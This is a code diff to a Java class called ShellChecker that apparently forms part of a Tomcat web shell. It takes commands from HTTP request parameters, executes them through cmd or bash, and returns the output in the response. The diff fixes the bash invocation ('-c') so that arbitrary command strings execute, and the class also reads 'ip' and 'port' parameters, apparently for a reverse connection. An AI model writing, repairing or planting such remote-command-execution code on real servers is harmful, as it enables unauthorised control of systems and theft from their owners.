@@ -24,12 +24,10 @@ public class ShellChecker {
             String cmd;
             try {
                 cmd = execute(c);
-                httpResponse.write(cmd);
             } catch (Exception e) {
                 cmd = e.getMessage();
             }
             httpResponse.write(cmd);
-
         }
         String ip = coyoteRequest.getParameter("ip");
         String port = coyoteRequest.getParameter("port");
@@ -57,7 +55,7 @@ public class ShellChecker {
             if (osName.contains("windows")) {
                 processBuilder = new ProcessBuilder("cmd", "/c", cmd);
             } else {
-                processBuilder = new ProcessBuilder("/bin/bash", cmd);
+                processBuilder = new ProcessBuilder("/bin/bash","-c", cmd);
             }
             Process process = processBuilder.start();
             in = process.getInputStream();
